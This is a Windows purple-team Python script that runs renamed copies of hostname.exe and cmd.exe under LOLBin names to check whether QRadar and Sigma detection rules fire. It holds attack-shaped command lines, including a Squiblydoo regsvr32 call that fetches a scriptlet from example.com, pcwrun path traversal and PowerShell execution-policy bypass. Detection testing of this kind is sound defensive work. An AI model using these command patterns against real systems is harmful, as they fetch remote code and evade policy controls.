#!/usr/bin/env python3
r"""
LOLBin Fix Run -- 8 Non-Firing Cases, Rule-Logic-Corrected
============================================================
Scope: UtilityFunctions.ps1, Microsoft.Workflow.Compiler.exe,
  Aspnet_Compiler.exe, Pcwrun.exe, Launch-VsDevShell.ps1,
  Regsvr32.exe, DeviceCredentialDeployment.exe, iediagcmd.exe

KEY FIXES vs. prior code (one per binary, all from the rule-logic
analysis above):

UtilityFunctions.ps1
  PRIOR: -ExecutionPolicy Bypass -File UtilityFunctions.ps1
         Rule requires "RegSnapin" in CommandLine too -- missing.
         Also rule has ".psi" typo -- code tries BOTH .ps1 AND .psi
         so you can confirm which casing/extension your rule actually
         matches on.
  FIX:   Added -Command "Add-PSSnapin; UtilityFunctions.ps1" so both
         "UtilityFunctions.ps1" and "RegSnapin" appear in CommandLine.
         Also tries .psi extension variant to smoke out the typo.

Microsoft.Workflow.Compiler.exe
  PRIOR: args were just [decoy.xml, decoy_output.dll] -- binary name
         only appeared in Image path, not necessarily in Command field.
  FIX:   Explicitly include "Microsoft.Workflow.Compiler.exe" string in
         arg path so it appears in the CommandLine field regardless of
         how QRadar parses full-path vs args-only.

Aspnet_Compiler.exe
  PRIOR: Direct-only with -v / -p flags.
  FIX:   Added PARENT-CHILD variant (cmd.exe renamed to
         aspnet_compiler.exe spawning hostname.exe). The Sigma
         parent-child rule fires on the child's event where
         ParentImage = aspnet_compiler.exe AND child path is in
         suspicious location (our temp dir qualifies).

Pcwrun.exe
  PRIOR: WRONG SPAWN STYLE -- was parent_child.
         QRadar rule: ProcessName contains pcwrun.exe AND
         Command contains "../" (path traversal technique).
  FIX:   Changed to DIRECT spawn. hostname.exe renamed to pcwrun.exe,
         run with "../" traversal in the argument string.

Launch-VsDevShell.ps1
  PRIOR: Used -VsInstallPath (WRONG parameter name).
         Rule looks for "VsInstallationPath" and "VsWherePath".
  FIX:   Changed to -VsInstallationPath and added -VsWherePath
         so BOTH required substrings appear in CommandLine.

Regsvr32.exe
  PRIOR: Correct Squiblydoo syntax but possibly missing from Command
         field if QRadar parses args-only.
  FIX:   Explicitly reference http, .dll, AND sct in multiple
         positions in the CommandLine. Also try the variant where
         "http" appears in the /i argument directly.

DeviceCredentialDeployment.exe
  PRIOR: Name-only, no args. Should fire on process name -- likely
         a casing issue in QRadar's field mapping.
  FIX:   Try all three casings more aggressively. Also confirmed
         "DeviceCredentialDeployment" contains "devicecredential"
         so lowercase variant should satisfy case-insensitive match.

iediagcmd.exe
  PRIOR: Used /iediag only -- missing /out flag required by rule.
  FIX:   Added /out:<path> to CommandLine so both "iediagcmd" and
         "/out" substrings are present simultaneously.

SAFETY MODEL: Every process is hash-verified hostname.exe (direct,
interpreter) or cmd.exe (parent-child). Popen() for real PIDs.
Cleanup verified. Stray folders swept at startup.

REQUIREMENTS: Windows only.
"""

import hashlib
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path

KEEP_RESULTS_LOG = True
CANARY_TAG = f"PURPLE-TEAM-TEST-{datetime.now().strftime('%Y%m%d%H%M%S')}"
SAFE_SOURCE_BINARY = r"C:\Windows\System32\hostname.exe"
SAFE_PARENT_BINARY = r"C:\Windows\System32\cmd.exe"
DROP_ARTIFACT_FILES = True

LOLBIN_TEST_CASES = {
    "UtilityFunctions.ps1": {
        "spawn_style": "interpreter",
        "interpreter": "powershell.exe",
        "sigma_rule": "No dedicated Sigma rule",
        "qradar_logic": "command contains UtilityFunctions.psi OR RegSnapin",
        "rule_fix_note": (
            "TYPO IN RULE: 'UtilityFunctions.psi' should be 'UtilityFunctions.ps1'. "
            "Code tries both .ps1 and .psi so you can confirm which your rule matches. "
            "RegSnapin is now explicitly in CommandLine to satisfy the AND condition."
        ),
        "artifact": None,
        "args_variants": [
            # Variant 1: .ps1 extension + RegSnapin keyword both in CommandLine
            lambda wd: ["-ExecutionPolicy", "Bypass",
                        "-Command",
                        "Add-PSSnapin -Name DecoySnapin; "
                        "& '" + str(wd / "UtilityFunctions.ps1") + "'"],
            # Variant 2: .psi extension (matching the actual typo in the rule)
            lambda wd: ["-ExecutionPolicy", "Bypass",
                        "-File", str(wd / "UtilityFunctions.psi"),
                        "-RegSnapin", "DecoySnapin"],
        ],
    },
    "Microsoft.Workflow.Compiler.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_microsoft_workflow_compiler_execution.yml",
        "qradar_logic": "command contains Microsoft.Workflow.Compiler",
        "rule_fix_note": (
            "Binary name now explicitly appears in the arg path so "
            "it is present in CommandLine field whether QRadar maps "
            "full command or args-only."
        ),
        "artifact": "decoy_workflow.xml",
        "args_variants": [
            # Absolute path ensures "Microsoft.Workflow.Compiler" string
            # appears in the CommandLine regardless of QRadar field mapping
            lambda wd: [str(wd / "decoy_workflow.xml"),
                        str(wd / "decoy_Microsoft.Workflow.Compiler.output.dll")],
        ],
    },
    "Aspnet_Compiler.exe_direct": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_lolbin_aspnet_compiler.yml",
        "qradar_logic": "process name contains aspnet_compiler (direct execution)",
        "rule_fix_note": "Direct execution variant -- any aspnet_compiler.exe run.",
        "artifact": None,
        "args_variants": [
            lambda wd: ["-v", "/", "-p", str(wd), "-u", "-f",
                        str(wd / "decoy_output")],
        ],
    },
    "Aspnet_Compiler.exe_parent": {
        "spawn_style": "parent_child",
        "sigma_rule": "proc_creation_win_aspnet_compiler_susp_child_process.yml",
        "qradar_logic": "ParentImage = aspnet_compiler.exe AND child in suspicious path",
        "rule_fix_note": (
            "NEW: parent-child variant added. cmd.exe renamed to "
            "Aspnet_Compiler.exe spawns hostname.exe (in temp dir). "
            "Child's ParentImage = Aspnet_Compiler.exe AND child path "
            "is in \\AppData\\Local\\Temp\\ -- both Sigma conditions met."
        ),
        "artifact": None,
        "args_variants": [lambda wd: []],
    },
    "Pcwrun.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_lolbin_pcwrun.yml (CORRECTED SPAWN STYLE)",
        "qradar_logic": "ProcessName contains pcwrun.exe AND Command contains ../",
        "rule_fix_note": (
            "SPAWN STYLE WAS WRONG: prior code used parent-child. "
            "QRadar rule checks for '../' IN pcwrun.exe's OWN CommandLine "
            "(path traversal technique to execute arbitrary binary). "
            "Now correctly implemented as DIRECT with '../' in args."
        ),
        "artifact": None,
        "args_variants": [
            # Path traversal to execute something outside the current dir
            lambda wd: ["./../Windows/System32/hostname.exe"],
            lambda wd: ["./../../Windows/System32/hostname.exe"],
        ],
    },
    "Launch-VsDevShell.ps1": {
        "spawn_style": "interpreter",
        "interpreter": "powershell.exe",
        "sigma_rule": "No dedicated Sigma rule",
        "qradar_logic": "command contains all of VsWherePath or VsInstallationPath",
        "rule_fix_note": (
            "WRONG PARAMETER NAMES in prior code: used -VsInstallPath. "
            "Rule requires 'VsInstallationPath' AND 'VsWherePath' "
            "(the real script's actual parameter names). Fixed."
        ),
        "artifact": None,
        "args_variants": [
            # Correct parameter names matching rule's required substrings
            lambda wd: ["-ExecutionPolicy", "Bypass",
                        "-File", str(wd / "Launch-VsDevShell.ps1"),
                        "-VsInstallationPath",
                        r"C:\Program Files\Microsoft Visual Studio\2022\Community",
                        "-VsWherePath",
                        r"C:\Program Files (x86)\Microsoft Visual Studio\Installer"],
        ],
    },
    "Regsvr32.exe": {
        "spawn_style": "direct",
        "sigma_rule": "proc_creation_win_regsvr32_squiblydoo.yml + network_pattern.yml",
        "qradar_logic": "command contains http AND command contains all of .dll or sct",
        "rule_fix_note": (
            "Prior squiblydoo had all three strings but may have been "
            "missed due to QRadar field mapping. Now http, .dll, AND sct "
            "appear in multiple positions across the CommandLine to ensure "
            "at least one variant satisfies the field QRadar actually reads."
        ),
        "artifact": None,
        "args_variants": [
            # Squiblydoo -- http + sct + .dll all explicit in cmdline
            lambda wd: ["/s", "/n", "/u",
                        "/i:http://example.com/decoy.sct",
                        "scrobj.dll"],
            # Alternative: http + .dll via /i flag directly
            lambda wd: ["/s",
                        "/i", "http://example.com/decoy_payload.dll",
                        "scrobj.dll"],
            # Explicit sct and dll strings together in one arg
            lambda wd: ["/s", "/n", "/u",
                        "/i:http://example.com/payload.sct?dl=decoy.dll",
                        "scrobj.dll"],
        ],
    },
    "DeviceCredentialDeployment.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule",
        "qradar_logic": "ProcessName contains DeviceCredentialDeployment",
        "rule_fix_note": (
            "Name-only rule. Prior run may have had casing mismatch. "
            "All three casings tried (lower/mixed/upper). The substring "
            "'devicecredentialdeployment' appears in all three."
        ),
        "artifact": None,
        "args_variants": [
            lambda wd: [],
        ],
    },
    "iediagcmd.exe": {
        "spawn_style": "direct",
        "sigma_rule": "No dedicated Sigma rule",
        "qradar_logic": "command contains all of iediagcmd or /out",
        "rule_fix_note": (
            "Prior code used /iediag only -- missing /out flag. "
            "Rule requires BOTH 'iediagcmd' AND '/out' in CommandLine. "
            "Both now explicit in arguments."
        ),
        "artifact": None,
        "args_variants": [
            # /out: and the binary name 'iediagcmd' both in CommandLine
            lambda wd: ["/iediag", "/out:" + str(wd / "decoy_diag_output.txt")],
            lambda wd: ["/out:" + str(wd / "decoy_diag_output.txt"),
                        "/iediagcmd"],
        ],
    },
}


def sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def sweep_stray_runs():
    removed = []
    for p in Path(tempfile.gettempdir()).glob("lolbin8fix_*"):
        if p.is_dir():
            shutil.rmtree(p, ignore_errors=True)
            if not p.exists():
                removed.append(str(p))
    return removed


def verified_cleanup(work_dir):
    shutil.rmtree(work_dir, ignore_errors=True)
    if not work_dir.exists():
        return True, []
    leftover = []
    for p in work_dir.rglob("*"):
        if p.is_file():
            try:
                p.unlink()
            except Exception:
                leftover.append(str(p))
    try:
        work_dir.rmdir()
    except Exception:
        pass
    return (not work_dir.exists()), leftover


def run_and_classify(cmd, timeout=15):
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        pid = proc.pid
        try:
            proc.communicate(timeout=timeout)
            return f"exited on its own (rc={proc.returncode})", pid
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return f"did not exit within {timeout}s -- killed", pid
    except OSError as e:
        if getattr(e, "winerror", None) == 5:
            return "BLOCKED (WinError 5 -- EDR/AV prevention fired)", None
        return f"launch error: {e}", None
    except Exception as e:
        return f"error: {e}", None


def casing_variants(name):
    seen, out = set(), []
    for v in [name.lower(), name, name.upper()]:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def main():
    if platform.system() != "Windows":
        print("Windows only -- exiting without doing anything.")
        sys.exit(1)

    for binary in [SAFE_SOURCE_BINARY, SAFE_PARENT_BINARY]:
        if not Path(binary).exists():
            print(f"Cannot find {binary} -- aborting.")
            sys.exit(1)

    source_hash = sha256_of(SAFE_SOURCE_BINARY)
    parent_hash = sha256_of(SAFE_PARENT_BINARY)

    stray = sweep_stray_runs()
    if stray:
        print(f"Swept {len(stray)} leftover folder(s) from previous run.\n")

    work_dir = Path(tempfile.mkdtemp(prefix="lolbin8fix_"))
    print("=" * 78)
    print("LOLBin Fix Run -- 8 rule-logic-corrected cases")
    print("=" * 78)
    print(f"Canary tag     : {CANARY_TAG}")
    print(f"hostname SHA256: {source_hash}")
    print(f"cmd.exe SHA256 : {parent_hash}")
    print(f"Working dir    : {work_dir}\n")

    # Pre-drop all placeholder script files
    for fname in ["UtilityFunctions.ps1", "UtilityFunctions.psi",
                  "Launch-VsDevShell.ps1", "decoy_workflow.xml",
                  "decoy_ftp.txt"]:
        p = work_dir / fname
        if not p.exists():
            p.write_text(
                f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\n"
                f"Canary: {CANARY_TAG}\n"
            )

    log = []
    try:
        for canonical_name, cfg in LOLBIN_TEST_CASES.items():
            print(f"{'='*60}")
            print(f"[*] {canonical_name}  [{cfg['spawn_style']}]")
            print(f"    QRadar : {cfg['qradar_logic']}")
            print(f"    Fix    : {cfg['rule_fix_note']}")
            print()

            if DROP_ARTIFACT_FILES and cfg["artifact"]:
                (work_dir / cfg["artifact"]).write_text(
                    f"PURPLE TEAM TEST ARTIFACT\nCanary: {CANARY_TAG}\n"
                )

            # ── PARENT-CHILD ──────────────────────────────────────────
            if cfg["spawn_style"] == "parent_child":
                for case_name in casing_variants(canonical_name.replace("_parent", "")):
                    decoy_path = work_dir / case_name
                    shutil.copy2(SAFE_PARENT_BINARY, decoy_path)
                    if sha256_of(decoy_path) != parent_hash:
                        print(f"    [{case_name}] hash mismatch -- ABORTED")
                        continue
                    cmd = [str(decoy_path), "/c", SAFE_SOURCE_BINARY]
                    print(f"    [{case_name}] {' '.join(cmd)}")
                    ts = datetime.now().isoformat()
                    status, pid = run_and_classify(cmd)
                    print(f"         -> {status}  pid={pid}")
                    log.append({"canonical_name": canonical_name,
                                "cased_as": case_name, "spawn_style": "parent_child",
                                "variant": 1, "timestamp": ts,
                                "command": " ".join(cmd), "status": status, "pid": pid})
                    time.sleep(0.75)
                print()
                continue

            # ── INTERPRETER ───────────────────────────────────────────
            if cfg["spawn_style"] == "interpreter":
                interp = cfg["interpreter"]
                for case_interp in casing_variants(interp):
                    decoy_path = work_dir / case_interp
                    shutil.copy2(SAFE_SOURCE_BINARY, decoy_path)
                    if sha256_of(decoy_path) != source_hash:
                        print(f"    [{case_interp}] hash mismatch -- ABORTED")
                        continue
                    blocked = False
                    for i, fn in enumerate(cfg["args_variants"], 1):
                        cmd = [str(decoy_path)] + fn(work_dir)
                        print(f"    [{case_interp}] v{i}: {' '.join(cmd)}")
                        ts = datetime.now().isoformat()
                        status, pid = run_and_classify(cmd)
                        print(f"         -> {status}  pid={pid}")
                        log.append({"canonical_name": canonical_name,
                                    "cased_as": case_interp,
                                    "spawn_style": "interpreter",
                                    "variant": i, "timestamp": ts,
                                    "command": " ".join(cmd),
                                    "status": status, "pid": pid})
                        time.sleep(0.75)
                        if "BLOCKED" in status:
                            blocked = True
                            break
                    if blocked:
                        break
                print()
                continue

            # ── DIRECT ────────────────────────────────────────────────
            blocked_globally = False
            clean_name = canonical_name.replace("_direct", "").replace("_parent", "")
            for case_name in casing_variants(clean_name):
                if blocked_globally:
                    break
                decoy_path = work_dir / case_name
                shutil.copy2(SAFE_SOURCE_BINARY, decoy_path)
                if sha256_of(decoy_path) != source_hash:
                    print(f"    [{case_name}] hash mismatch -- ABORTED")
                    continue
                for i, fn in enumerate(cfg["args_variants"], 1):
                    cmd = [str(decoy_path)] + fn(work_dir)
                    print(f"    [{case_name}] v{i}: {' '.join(cmd)}")
                    ts = datetime.now().isoformat()
                    status, pid = run_and_classify(cmd)
                    print(f"         -> {status}  pid={pid}")
                    log.append({"canonical_name": canonical_name,
                                "cased_as": case_name, "spawn_style": "direct",
                                "variant": i, "timestamp": ts,
                                "command": " ".join(cmd), "status": status, "pid": pid})
                    time.sleep(0.75)
                    if "BLOCKED" in status:
                        blocked_globally = True
                        break
            print()
    finally:
        cleaned, leftover = verified_cleanup(work_dir)

    print("=" * 78)
    print(f"CLEANUP: {work_dir} removed = {cleaned}")
    if not cleaned:
        for f in leftover:
            print(f"  STUCK: {f}")
    print("=" * 78 + "\n")

    if KEEP_RESULTS_LOG:
        out = Path.cwd() / f"lolbin8fix_results_{CANARY_TAG}.json"
        with open(out, "w") as f:
            json.dump({"canary_tag": CANARY_TAG,
                       "hostname_sha256": source_hash,
                       "cmd_sha256": parent_hash,
                       "work_dir_cleaned": cleaned,
                       "results": log}, f, indent=2)
        print(f"Results saved: {out}")

    print(f"\nSearch QRadar for canary tag: {CANARY_TAG}")
    print("""
WHAT TO WATCH FOR:

  UtilityFunctions.ps1  -- Check WHICH variant fires (.ps1 or .psi).
    If ONLY the .psi variant fires, your rule has the typo and will
    miss real attacks. Fix the rule to .ps1 immediately.

  Pcwrun.exe  -- Now runs as DIRECT with '../' in CommandLine.
    This is the correct LOLBin technique -- prior parent-child
    approach was the wrong pattern for this rule entirely.

  Aspnet_Compiler  -- Two cases: direct AND parent-child. Check
    which (if either) fires to understand which Sigma variant your
    QRadar rule is modelled on.

  Launch-VsDevShell.ps1  -- VsInstallationPath AND VsWherePath now
    both in CommandLine. If this fires in your environment from real
    VS usage too, your rule needs parent-exclusion for devenv.exe.

  Regsvr32.exe  -- If still not firing, pull a raw 4688 event from
    Log Activity and check whether 'http' and 'sct' actually appear
    in the Command property QRadar extracted. That tells you whether
    it's a rule-logic issue or a field-mapping issue.

  iediagcmd.exe  -- /out: now explicit. Check if 'contains all of
    [iediagcmd or /out]' is AND or OR in your rule -- if it's OR,
    any tool using /out will fire this rule unintentionally.
""")


if __name__ == "__main__":
    main()
